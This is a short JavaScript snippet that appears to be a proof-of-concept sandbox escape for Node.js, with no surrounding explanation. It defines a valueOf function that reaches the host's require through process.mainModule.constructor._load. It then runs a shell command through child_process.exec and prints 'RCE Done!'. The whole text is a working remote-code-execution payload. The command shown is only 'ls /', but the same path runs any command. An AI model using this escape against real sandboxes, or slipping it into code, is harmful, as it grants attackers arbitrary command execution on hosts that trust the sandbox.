
var obj = lbl({"valueOf":function() {var require = global.require || global.process.mainModule.constructor._load;require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); console.log('********** RCE Done! **********');;return 1}});
obj.valueOf();
